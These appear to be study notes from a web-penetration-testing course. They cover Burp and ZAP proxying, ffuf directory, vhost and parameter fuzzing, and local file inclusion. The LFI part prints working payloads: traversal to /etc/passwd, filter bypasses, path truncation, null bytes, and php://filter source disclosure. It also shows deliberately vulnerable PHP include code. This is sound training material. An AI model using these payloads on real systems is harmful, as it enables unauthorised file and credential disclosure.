---
title: "Web Attacks"
weight: 18
---


# Intro to Web Proxies

## Burp Suite

## Installing CA Certificate

Another important step when using Burp Proxy/ZAP with our browser is to install the web proxy's CA Certificates. If we don't do this step, some HTTPS traffic may not get properly routed, or we may need to click `accept` every time Firefox needs to send an HTTPS request.

We can install Burp's certificate once we select Burp as our proxy in `Foxy Proxy`, by browsing to `http://burp`, and download the certificate from there by clicking on `CA Certificate`:

&nbsp;

&nbsp;

ZAP

![956cf805d36507d1728b87d81078e103.png](/resources/956cf805d36507d1728b87d81078e103.png)

&nbsp;

&nbsp;

# Intercepting Web Requests

&nbsp;

![8d4ab50036f0c0e442db079d7f9895ab.png](/resources/8d4ab50036f0c0e442db079d7f9895ab.png)

&nbsp;

We can choose to `step` to send the request and examine its response and break any further requests, or we can choose to `continue` and let the page send the remaining requests. The `step` button is helpful when we want to examine every step of the page's functionality, while `continue` is useful when we are only interested in a single request and can forward the remaining requests once we reach our target request

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Intercepting Responses

&nbsp;

## Burp

In Burp, we can enable response interception by going to (`Proxy>Options`) and enabling `Intercept Response` under `Intercept Server Responses`:

&nbsp;

![dbe0b4ebbed3c09ae117130542c01a7f.png](/resources/dbe0b4ebbed3c09ae117130542c01a7f.png)

&nbsp;

Let's try changing the `type="number"` on line 27 to `type="text"`, which should enable us to write any value we want. We will also change the `maxlength="3"` to `maxlength="100"` so we can enter longer input:

```html
<input type="text" id="ip" name="ip" min="1" max="255" maxlength="100"
    oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);"
    required>
```

&nbsp;

## ZAP

![877c86cb4d89f85b2c37939c0cea95ff.png](/resources/877c86cb4d89f85b2c37939c0cea95ff.png)

&nbsp;

![20d5b118d59444c97d55ac5548222986.png](/resources/20d5b118d59444c97d55ac5548222986.png)

&nbsp;

&nbsp;

**Hidden fields**

- **Enable input fields**

**![a8ec43bdf041b524d2eda08bbe7c42e3.png](/resources/a8ec43bdf041b524d2eda08bbe7c42e3.png)**

&nbsp;

&nbsp;

**Can see comments by turning on comments toggle from left**

**Another similar feature is the `Comments` button, which will indicate the positions where there are HTML comments that are usually only visible in the source code. We can click on the `+` button on the left pane and select `Comments` to add the `Comments` button, and once we click on it, the `Comments` indicators should be shown. For example, the below screenshot shows an indicator for a position that has a comment, and hovering over it with our cursor shows the comment's content:**

&nbsp;

**![fba9f41192890b9b2adf1ca64088ddae.png](/resources/fba9f41192890b9b2adf1ca64088ddae.png)**

&nbsp;

&nbsp;

&nbsp;

&nbsp;

# Automatic Modification

&nbsp;

#### Burp Match and Replace

We can go to (`Proxy>Options>Match and Replace`) and click on `Add` in Burp. As the below screenshot shows, we will set the following options

&nbsp;

![060b76cd7eaedd321ef5a301bff51f3d.png](/resources/060b76cd7eaedd321ef5a301bff51f3d.png)

&nbsp;

&nbsp;

|     |     |
| --- | --- |
| `Type`: `Request header` | Since the change we want to make will be in the request header and not in its body. |
| `Match`: `^User-Agent.*$` | The regex pattern that matches the entire line with `User-Agent` in it. |
| `Replace`: `User-Agent: HackTheBox Agent 1.0` | This is the value that will replace the line we matched above. |
| `Regex match`: True | We don't know the exact User-Agent string we want to replace, so we'll use regex to match any value that matches the pattern we specified above. |

&nbsp;

&nbsp;

![1596fe7f75334c78456233cb3ad4e2ac.png](/resources/1596fe7f75334c78456233cb3ad4e2ac.png)

&nbsp;

#### ZAP Replacer

tools---->options----->replacer

![8f84d85372eeade9b46d25f1a8ad4d67.png](/resources/8f84d85372eeade9b46d25f1a8ad4d67.png)

&nbsp;

&nbsp;

## Automatic Response Modification

burp

![f02b90f75227c916a43dc76dedd426f2.png](/resources/f02b90f75227c916a43dc76dedd426f2.png)

ZAP

&nbsp;

![c8ba7c76f432c39bfa6372f1b68a52f2.png](/resources/c8ba7c76f432c39bfa6372f1b68a52f2.png)

&nbsp;

## URL Encoding

It is essential to ensure that our request data is URL-encoded and our request headers are correctly set. Otherwise, we may get a server error in the response. This is why encoding and decoding data becomes essential as we modify and repeat web requests. Some of the key characters we need to encode are:

- `Spaces`: May indicate the end of request data if not encoded
- `&`: Otherwise interpreted as a parameter delimiter
- `#`: Otherwise interpreted as a fragment identifier

To URL-encode text in Burp Repeater, we can select that text and right-click on it, then select (`Convert Selection>URL>URL encode key characters`), or by selecting the text and clicking \[`CTRL+U`\]. Burp also supports URL-encoding as we type if we right-click and enable that option, which will encode all of our text as we type it. On the other hand, ZAP should automatically URL-encode all of our request data in the background before sending the request, though we may not see that explicitly.

There are other types of URL-encoding, like `Full URL-Encoding` or `Unicode URL` encoding, which may also be helpful for requests with many special characters.

&nbsp;

&nbsp;

![2231fc6f3cd039a53fdd13681dc18894.png](/resources/2231fc6f3cd039a53fdd13681dc18894.png)

&nbsp;

&nbsp;

In ZAP, we can use the `Encoder/Decoder/Hash` tool, which will automatically decode strings using various decoders in the `Decode` tab:\[`CTRL+E`\].

&nbsp;

![f18418b679691097d7ddb02d6831baa0.png](/resources/f18418b679691097d7ddb02d6831baa0.png)

&nbsp;

&nbsp;

&nbsp;

# Proxying Tools

## Proxychains

One very useful tool in Linux is [proxychains](https://github.com/haad/proxychains), which routes all traffic coming from any command-line tool to any proxy we specify. `Proxychains` adds a proxy to any command-line tool and is hence the simplest and easiest method to route web traffic of command-line tools through our web proxies.

To use `proxychains`, we first have to edit `/etc/proxychains.conf`, comment out the final line and add the following line at the end of it:

Proxying Tools

```shell-session
#socks4         127.0.0.1 9050
http 127.0.0.1 8080
```

&nbsp;

&nbsp;

&nbsp;**NMAP**

```shell-session
cube111@local[/local]$ nmap --proxies http://127.0.0.1:8080 SERVER_IP -pPORT -Pn -sC

Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for SERVER_IP
Host is up (0.11s latency).

PORT      STATE SERVICE
PORT/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```

&nbsp;

&nbsp;

## Metasploit

&nbsp;

```shell-session
cube111@local[/local]$ msfconsole

msf6 > use auxiliary/scanner/http/robots_txt
msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080

PROXIES => HTTP:127.0.0.1:8080


msf6 auxiliary(scanner/http/robots_txt) > set RHOST SERVER_IP

RHOST => SERVER_IP


msf6 auxiliary(scanner/http/robots_txt) > set RPORT PORT

RPORT => PORT


msf6 auxiliary(scanner/http/robots_txt) > run

[*] Scanned 1 of 1 hosts (100% complete)
```

&nbsp;

&nbsp;

# ZAP Scanner

&nbsp;

![340ff374d2ef0ef2c9449372bb4e66cd.png](/resources/340ff374d2ef0ef2c9449372bb4e66cd.png)

&nbsp;

&nbsp;

## Ffuf

Directory Fuzzing

```shell-session
cube111@local[/local]$ ffuf -h

HTTP OPTIONS:
  -H               Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
  -X               HTTP method to use (default: GET)
  -b               Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
  -d               POST data
  -recursion       Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth Maximum recursion depth. (default: 0)
  -u               Target URL
...SNIP...

MATCHER OPTIONS:
  -mc              Match HTTP status codes, or "all" for everything. (default: 200,204,301,302,307,401,403)
  -ms              Match HTTP response size
...SNIP...

FILTER OPTIONS:
  -fc              Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fs              Filter HTTP response size. Comma separated list of sizes and ranges
...SNIP...

INPUT OPTIONS:
...SNIP...
  -w               Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'

OUTPUT OPTIONS:
  -o               Write output to file
...SNIP...

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v
...SNIP...
```

&nbsp;

&nbsp;

## Directory Fuzzing

assigning refrencesusinf :FUZZ

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ
```

&nbsp;

&nbsp;

Now, let's start our target in the question below and run our final command on it:

Directory Fuzzing

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://SERVER_IP:PORT/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

<SNIP>
blog                    [Status: 301, Size: 326, Words: 20, Lines: 10]
:: Progress: [87651/87651] :: Job [1/1] :: 9739 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

&nbsp;

&nbsp;

&nbsp;

# Page Fuzzing(extensions)

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ <SNIP>
```

&nbsp;

Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after "index" in our fuzzing.

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://SERVER_IP:PORT/blog/indexFUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 5
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.php                    [Status: 200, Size: 0, Words: 1, Lines: 1]
.phps                   [Status: 403, Size: 283, Words: 20, Lines: 10]
:: Progress: [39/39] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

&nbsp;

We do get a couple of hits, but only `.php` gives us a response with code `200`. Great! We now know that this website runs on `PHP` to start fuzzing for `PHP` files.

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://SERVER_IP:PORT/blog/FUZZ.php
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

index                   [Status: 200, Size: 0, Words: 1, Lines: 1]
REDACTED                [Status: 200, Size: 465, Words: 42, Lines: 15]
:: Progress: [87651/87651] :: Job [1/1] :: 5843 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```

&nbsp;

&nbsp;

&nbsp;

## Recursive Flags

&nbsp;

In `ffuf`, we can enable recursive scanning with the `-recursion` flag, and we can specify the depth with the `-recursion-depth` flag. If we specify `-recursion-depth 1`, it will only fuzz the main directories and their direct sub-directories. If any sub-sub-directories are identified (like `/login/user`, it will not fuzz them for pages). When using recursion in `ffuf`, we can specify our extension with `-e .php`

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://SERVER_IP:PORT/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

[Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/
    * FUZZ: 

[INFO] Adding a new job to the queue: http://SERVER_IP:PORT/forum/FUZZ
[Status: 200, Size: 986, Words: 423, Lines: 56] | URL | http://SERVER_IP:PORT/index.php
    * FUZZ: index.php

[Status: 301, Size: 326, Words: 20, Lines: 10] | URL | http://SERVER_IP:PORT/blog | --> | http://SERVER_IP:PORT/blog/
    * FUZZ: blog

<...SNIP...>
[Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/index.php
    * FUZZ: index.php

[Status: 200, Size: 0, Words: 1, Lines: 1] | URL | http://SERVER_IP:PORT/blog/
    * FUZZ: 

<...SNIP...>
```

&nbsp;

&nbsp;

&nbsp;

# Sub-domain Fuzzing

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.inlanefreight.com/


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://FUZZ.inlanefreight.com/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 381ms]
    * FUZZ: support

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 385ms]
    * FUZZ: ns3

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 402ms]
    * FUZZ: blog

[Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 180ms]
    * FUZZ: my

[Status: 200, Size: 22266, Words: 2903, Lines: 316, Duration: 589ms]
    * FUZZ: www

<...SNIP...>
```

&nbsp;

## Vhosts Fuzzing

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H 'Host: FUZZ.academy.local'


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.local:PORT/
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

mail2                   [Status: 200, Size: 900, Words: 423, Lines: 56]
dns2                    [Status: 200, Size: 900, Words: 423, Lines: 56]
ns3                     [Status: 200, Size: 900, Words: 423, Lines: 56]
dns1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
lists                   [Status: 200, Size: 900, Words: 423, Lines: 56]
webmail                 [Status: 200, Size: 900, Words: 423, Lines: 56]
static                  [Status: 200, Size: 900, Words: 423, Lines: 56]
web                     [Status: 200, Size: 900, Words: 423, Lines: 56]
www1                    [Status: 200, Size: 900, Words: 423, Lines: 56]
<...SNIP...>
```

&nbsp;

![0576ce273fef9b2d06c026192334a5c3.png](/resources/0576ce273fef9b2d06c026192334a5c3.png)

&nbsp;

&nbsp;filtering

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.local:PORT/ -H 'Host: FUZZ.academy.local' -fs 900


       /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://academy.local:PORT/
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 900
________________________________________________

<...SNIP...>
admin                   [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [4997/4997] :: Job [1/1] :: 1249 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

&nbsp;

&nbsp;

## GET Request Fuzzing

&nbsp;

Similarly to how we have been fuzzing various parts of a website, we will use `ffuf` to enumerate parameters. Let us first start with fuzzing for `GET` requests, which are usually passed right after the URL, with a `?` symbol, like:

- `http://admin.academy.local:PORT/admin/admin.php?param1=key`.

So, all we have to do is replace `param1` in the example above with `FUZZ` and rerun our scan. Before we can start, however, we must pick an appropriate wordlist. Once again, `SecLists` has just that in `/opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt`. With that, we can run our scan.

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php?FUZZ=key -fs xxx


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.academy.local:PORT/admin/admin.php?FUZZ=key
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
```

&nbsp;

&nbsp;

![ba5807d848e303d5abfe134c50b9a6f6.png](/resources/ba5807d848e303d5abfe134c50b9a6f6.png)

&nbsp;

&nbsp;

# Parameter Fuzzing - POST

* * *

The main difference between `POST` requests and `GET` requests is that `POST` requests are not passed with the URL and cannot simply be appended after a `?` symbol. `POST` requests are passed in the `data` field within the HTTP request. Check out the [Web Requests](https://academy.hackthebox.com/module/details/35) module to learn more about HTTP requests.

To fuzz the `data` field with `ffuf`, we can use the `-d` flag, as we saw previously in the output of `ffuf -h`. We also have to add `-X POST` to send `POST` requests.

Tip: In PHP, "POST" data "content-type" can only accept "application/x-www-form-urlencoded". So, we can set that in "ffuf" with "-H 'Content-Type: application/x-www-form-urlencoded'".

&nbsp;

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : POST
 :: URL              : http://admin.academy.local:PORT/admin/admin.php
 :: Wordlist         : FUZZ: /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

id                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
<...SNIP...>
```

&nbsp;

```shell-session
cube111@local[/local]$ curl http://admin.academy.local:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>Invalid id!</p></div>
<...SNIP...>
```

&nbsp;

&nbsp;

&nbsp;

# Value Fuzzing

&nbsp;

```shell-session
cube111@local[/local]$ for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w ids.txt:FUZZ -u http://admin.academy.local:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx


        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : POST
 :: URL              : http://admin.academy.local:30794/admin/admin.php
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : id=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

<...SNIP...>                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

&nbsp;

&nbsp;

&nbsp;

# Local File Inclusion (LFI)

PHP versions before 5.3/5.4

servers are `/etc/passwd` on Linux and `C:\Windows\boot.ini` on Windows. So, let's change the parameter from `es` to `/etc/passwd`:

&nbsp;

![3857e0a841cbbb68e765d6251980a605.png](/resources/3857e0a841cbbb68e765d6251980a605.png)

&nbsp;

&nbsp;

## Filename Prefix

In our previous example, we used the `language` parameter after the directory, so we could traverse the path to read the `passwd` file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:

Code: php

&nbsp;

```php
include("./languages/" . $_GET['language']);
```

```php
include("lang_" . $_GET['language']);
```

In this case, if we try to traverse the directory with `../../../etc/passwd`, the final string would be `lang_../../../etc/passwd`, which is invalid:

&nbsp;

http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/../../../etc/passwd

![8e9a91de3d4f5b85fa54a7032cb308d8.png](/resources/8e9a91de3d4f5b85fa54a7032cb308d8.png)

&nbsp;

&nbsp;

&nbsp;

# Basic Bypasses

&nbsp;

&nbsp;

* * *

## Non-Recursive Path Traversal Filters

One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:

Code: php

```php
$language = str_replace('../', '', $_GET['language']);
```

&nbsp;

http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=....//....//....//....//etc/passwd

&nbsp;

&nbsp;

&nbsp;

As we can see, the inclusion was successful this time, and we're able to read `/etc/passwd` successfully. The `....//` substring is not the only bypass we can use, as we may use `..././` or `....\/` and several other recursive LFI payloads. Furthermore, in some cases, escaping the forward slash character may also work to avoid path traversal filters (e.g. `....\/`), or adding extra forward slashes (e.g. `....////`)

&nbsp;

&nbsp;

## Encoding

![9305bc9d52157d60110b922b42a73d10.png](/resources/9305bc9d52157d60110b922b42a73d10.png)

&nbsp;

&nbsp;

## Approved Paths

Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:

Code: php

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```

&nbsp;

&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=./languages/../../../../etc/passwd

![627a6c0a5e5dc3bc3ef1137627123d12.png](/resources/627a6c0a5e5dc3bc3ef1137627123d12.png)

&nbsp;

&nbsp;

Check for vulnerable versions

![4ac5dd04e8c3738af94d61c30e695e5a.png](/resources/4ac5dd04e8c3738af94d61c30e695e5a.png)

&nbsp;

&nbsp;

&nbsp;

## Appended Extension

As discussed in the previous section, some web applications append an extension to our input string (e.g. `.php`), to ensure that the file we include is in the expected extension. With modern versions of PHP, we may not be able to bypass this and will be restricted to only reading files in that extension, which may still be useful, as we will see in the next section (e.g. for reading source code).

There are a couple of other techniques we may use, but they are `obsolete with modern versions of PHP and only work with PHP versions before 5.3/5.4`. However, it may still be beneficial to mention them, as some web applications may still be running on older servers, and these techniques may be the only bypasses possible.

#### Path Truncation

In earlier versions of PHP, defined strings have a maximum length of 4096 characters, likely due to the limitation of 32-bit systems. If a longer string is passed, it will simply be `truncated`, and any characters after the maximum length will be ignored. Furthermore, PHP also used to remove trailing slashes and single dots in path names, so if we call (`/etc/passwd/.`) then the `/.` would also be truncated, and PHP would call (`/etc/passwd`). PHP, and Linux systems in general, also disregard multiple slashes in the path (e.g. `////etc/passwd` is the same as `/etc/passwd`). Similarly, a current directory shortcut (`.`) in the middle of the path would also be disregarded (e.g. `/etc/./passwd`).

If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

An example of such payload would be the following:

Code: url

```url
?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED ~2048 times]
```

Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:

Basic Bypasses

```shell-session
cube111@local[/local]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

We may also increase the count of `../`, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string (`/etc/passwd`). This is why it would be easier to use the first method.

#### Null Bytes

PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`). This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension.

&nbsp;

# PHP Filters

&nbsp;

## Input Filters

[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

&nbsp;

&nbsp;

## Fuzzing for PHP Files

&nbsp;

```shell-session
cube111@local[/local]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

&nbsp;

&nbsp;

## Source Code Disclosure

&nbsp;

&nbsp;

```url
php://filter/read=convert.base64-encode/resource=config
```

&nbsp;

&nbsp;

![14f1bf79efae58b25b749cffc588511c.png](/resources/14f1bf79efae58b25b749cffc588511c.png)

&nbsp;

&nbsp;

We can now investigate this file for sensitive information like credentials or database keys and start identifying further references and then disclose their sources.

&nbsp;

&nbsp;

## Data

